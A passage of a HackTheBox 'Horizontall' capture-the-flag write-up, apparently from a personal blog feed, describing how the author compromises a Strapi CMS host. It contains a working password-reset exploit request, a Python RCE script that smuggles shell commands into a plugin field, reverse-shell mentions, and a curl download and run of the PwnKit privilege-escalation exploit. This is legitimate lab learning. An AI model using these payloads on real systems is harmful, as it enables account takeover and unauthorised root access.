+&lt;span class="n">resetPasswordReq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">userEmail&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/admin/plugins/users-permissions/auth/reset-password&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">)}&lt;/span>
+&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">resetPasswordReq&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="c1"># Set new password&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Setting new password&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">exploit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:{},&lt;/span> &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">newPassword&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;passwordConfirmation&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">newPassword&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="n">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/admin/auth/reset-password&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The code seems to simply send a specially formatted JSON to the aforementioned &amp;lsquo;Forgot your password?&amp;rsquo; URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the &lt;code>Host:&lt;/code> header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:&lt;/p>
+&lt;pre tabindex="0">&lt;code>POST /admin/auth/reset-password HTTP/1.1
+Host: api-prod.horizontall.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://api-prod.horizontall.htb/admin/auth/login
+Content-Type: application/json
+Origin: http://api-prod.horizontall.htb
+Content-Length: 146
+DNT: 1
+Connection: close
+{&amp;quot;code&amp;quot; : {&amp;quot;$gt&amp;quot;:0},
+&amp;quot;password&amp;quot; : &amp;quot;SuperStrongPassword1&amp;quot;,
+&amp;quot;passwordConfirmation&amp;quot; : &amp;quot;SuperStrongPassword1&amp;quot;
+}
+&lt;/code>&lt;/pre>&lt;p>I hit send on Burp Suite and cross my fingers&amp;hellip;&lt;/p>
+&lt;p>I&amp;rsquo;m met with a &lt;code>200 OK&lt;/code> reply! Along with an accompanying &lt;code>JWT&lt;/code> token, admin username and email address!&lt;/p>
+&lt;pre tabindex="0">&lt;code>HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Fri, 04 Feb 2022 17:42:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 249
+Connection: close
+Vary: Origin
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Powered-By: Strapi &amp;lt;strapi.io&amp;gt;
+{&amp;quot;jwt&amp;quot;:&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec&amp;quot;,&amp;quot;user&amp;quot;:{&amp;quot;id&amp;quot;:3,&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;email&amp;quot;:&amp;quot;admin@horizontall.htb&amp;quot;,&amp;quot;blocked&amp;quot;:null}}
+&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try that log-in now :3&lt;/p>
+&lt;h3 id="admin-log-in--api-prodhorizontallhtbadmin">Admin log-in @ api-prod.horizontall.htb/admin&lt;/h3>
+&lt;p>Logging in with the &lt;code>SuperStrongPassword1&lt;/code> after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 174;
+flex-basis: 419px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard.png" data-size="1391x796">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard.png"
+width="1391"
+height="796"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Strapi CMS Admin Dashboard">
+&lt;/a>
+&lt;figcaption>Strapi CMS Admin Dashboard&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>What instantly caught my eye was the &lt;code>Files Upload&lt;/code> tab in the Plugins section. Sure enough, I could upload a file. I went to &lt;a class="link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener"
+>PayloadsAllTheThings&lt;/a> for inspiration, crafted and uploaded myself a PHP reverse shell payload.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 322;
+flex-basis: 773px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload.png" data-size="1376x427">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload.png"
+width="1376"
+height="427"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Reverse shell upload">
+&lt;/a>
+&lt;figcaption>Reverse shell upload&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>Unfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn&amp;rsquo;t seem that different from the password reset exploit, so I had fairly high hopes.&lt;/p>
+&lt;h3 id="remote-code-execution-rce-authenticated--user-flag">Remote Code Execution (RCE) (Authenticated) &amp;amp; User Flag&lt;/h3>
+&lt;p>While working with &lt;a class="link" href="https://www.exploit-db.com/exploits/50238" target="_blank" rel="noopener"
+>the RCE exploit&lt;/a> I also again encountered some Python weirdness. Mostly regarding the &lt;code>JWT&lt;/code> token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same &lt;code>/admin/plugins/install&lt;/code> path, hard-coded in the &lt;code>JWT&lt;/code> and target &lt;code>URL&lt;/code>. At the end, it looked like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;span class="kn">from&lt;/span> &lt;span class="nn">cmd&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Cmd&lt;/span>
+&lt;span class="k">class&lt;/span> &lt;span class="nc">Terminal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Cmd&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">prompt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;$&amp;gt; &amp;#34;&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">default&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">code_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">code_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">global&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">url&lt;/span>
+&lt;span class="n">jwt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI&amp;#34;&lt;/span>
+&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://api-prod.horizontall.htb&amp;#34;&lt;/span>
+&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;Authorization&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Bearer &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">jwt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;plugin&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;documentation &amp;amp;&amp;amp; $(&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;port&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1337&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="n">out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">/admin/plugins/install&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">terminal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Terminal&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">terminal&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cmdloop&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the exploit did seem to do something, it would always respond with a &amp;ldquo;Bad Request&amp;rdquo; HTTP reply, instead of the output of &lt;code>id&lt;/code> or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
+>RevShells&lt;/a> to help me out crafting the command itself.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 138;
+flex-basis: 332px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access.png" data-size="812x586">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access.png"
+width="812"
+height="586"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="User Access">
+&lt;/a>
+&lt;figcaption>User Access&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>And I got myself a shell! I checked out &lt;code>/home&lt;/code> and grabbed the user flag :)&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 141;
+flex-basis: 340px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag.png" data-size="499x352">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag.png"
+width="499"
+height="352"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="User Flag">
+&lt;/a>
+&lt;figcaption>User Flag&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>It was now time to try and get root access.&lt;/p>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="sudo-and-suid-enumeration">SUDO and SUID enumeration&lt;/h3>
+&lt;p>One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.&lt;/p>
+&lt;p>Let&amp;rsquo;s look for SUDO access first.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo -l
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was requested a password, so this avenue won&amp;rsquo;t work.&lt;/p>
+&lt;p>Next, I tried to look for easily exploitable binaries with SUID bits.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I tried cross-referencing the output with the SUID list over at &lt;a class="link" href="https://gtfobins.github.io/#&amp;#43;suid" target="_blank" rel="noopener"
+>GTFOBins&lt;/a>, but did not find anything out of the ordinary.&lt;/p>
+&lt;h3 id="linux-exploit-suggester">Linux Exploit Suggester&lt;/h3>
+&lt;p>On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.&lt;/p>
+&lt;p>Next, I &lt;code>curl&lt;/code>&amp;rsquo;d myself the &lt;a class="link" href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener"
+>Linux Exploit Suggester&lt;/a> onto the remote machine and let it do its thing.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">strapi@horizontall:~$ ./les.sh
+Available information:
+Kernel version: 4.15.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+Additional checks &lt;span class="o">(&lt;/span>CONFIG_*, sysctl entries, custom Bash commands&lt;span class="o">)&lt;/span>: performed
+Package listing: from current OS
+Searching among:
+&lt;span class="m">78&lt;/span> kernel space exploits
+&lt;span class="m">49&lt;/span> user space exploits
+Possible Exploits:
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>CVE-2021-4034&lt;span class="o">]&lt;/span> PwnKit
+Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+Exposure: probable
+Tags: &lt;span class="o">[&lt;/span> &lt;span class="nv">ubuntu&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">|&lt;/span>11&lt;span class="p">|&lt;/span>12&lt;span class="p">|&lt;/span>13&lt;span class="p">|&lt;/span>14&lt;span class="p">|&lt;/span>15&lt;span class="p">|&lt;/span>16&lt;span class="p">|&lt;/span>17&lt;span class="p">|&lt;/span>18&lt;span class="p">|&lt;/span>19&lt;span class="p">|&lt;/span>20&lt;span class="p">|&lt;/span>&lt;span class="m">21&lt;/span> &lt;span class="o">]&lt;/span>,debian&lt;span class="o">=&lt;/span>7&lt;span class="p">|&lt;/span>8&lt;span class="p">|&lt;/span>9&lt;span class="p">|&lt;/span>10&lt;span class="p">|&lt;/span>11,fedora,manjaro
+Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Seeing the PwnKit exploit pop-up made me smile. I was listening to &lt;a class="link" href="https://open.spotify.com/show/6oeUmMwv1AQpdYNHmOE4A0" target="_blank" rel="noopener"
+>SANS Internet Stormcenter Podcast&lt;/a> a few days ago and heard about a new &lt;code>pollkit&lt;/code> exploit (&lt;code>&amp;quot;PwnKit&amp;quot;&lt;/code> &lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034" target="_blank" rel="noopener"
+>CVE-2021-4034&lt;/a>) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the &amp;lsquo;intended&amp;rsquo; exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.&lt;/p>
+&lt;h3 id="pwnkit--system-flag">PwnKit &amp;amp; System Flag&lt;/h3>
+&lt;p>Applying the exploit was trivial. &lt;code>LES&lt;/code> had even given me a download link. And just like with &lt;code>LES&lt;/code>, I &lt;code>curl&lt;/code>&amp;rsquo;d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now &lt;code>root&lt;/code>. I went and snatched the system flag. And that&amp;rsquo;s it for Horizontall.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">strapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit
+% Total % Received % Xferd Average Speed Time Time Time Current
+Dload Upload Total Spent Left Speed
+&lt;span class="m">100&lt;/span> &lt;span class="m">14688&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">14688&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> 103k &lt;span class="m">0&lt;/span> --:--:-- --:--:-- --:--:-- 103k
+strapi@horizontall:~$ chmod +x pwnkit
+strapi@horizontall:~$ ./pwnkit
+root@horizontall:/opt/strapi# id
+&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span>,1001&lt;span class="o">(&lt;/span>strapi&lt;span class="o">)&lt;/span>
+root@horizontall:/opt/strapi# whoami
+root
+root@horizontall:/opt/strapi# &lt;span class="nb">cd&lt;/span> ~
+root@horizontall:~# ls
+boot.sh pid restart.sh root.txt
+root@horizontall:~# cat root.txt
+ed9440c3385bdec9f943c2cc3c0af71e
+root@horizontall:~#
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>&lt;strong>NOTE:&lt;/strong>&lt;/em> If you would like to read the &amp;lsquo;intended&amp;rsquo; or &amp;lsquo;proper&amp;rsquo; way of the gaining &lt;code>root&lt;/code> access, involving a Laravel Debug Mode RCE, I strongly recommend &lt;a class="link" href="https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html" target="_blank" rel="noopener"
+>0xdf&amp;rsquo;s writeup of Horizontall&lt;/a>.&lt;/p>
+&lt;h2 id="outro">Outro&lt;/h2>
+&lt;p>And that&amp;rsquo;s that. In the future, I will probably go through HackTheBox&amp;rsquo;s &amp;lsquo;Starting Point&amp;rsquo; set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the &amp;lsquo;Easy&amp;rsquo; boxes rather than going for the &amp;lsquo;Very Easy&amp;rsquo; ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.&lt;/p>
+&lt;p>Whilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The &lt;code>api-prod&lt;/code> subdomain was hidden in one of the minified &lt;code>.js&lt;/code> files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.&lt;/p>
+&lt;p>I was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I&amp;rsquo;m still a beginner, so I believe noticing these things sooner requires time and experience.&lt;/p>
+&lt;p>All in all, I feel like I have many areas to improve in, but at the same time, I&amp;rsquo;m glad I didn&amp;rsquo;t got completely stumped by one of the slightly more challenging boxes. :)&lt;/p></description></item></channel></rss>
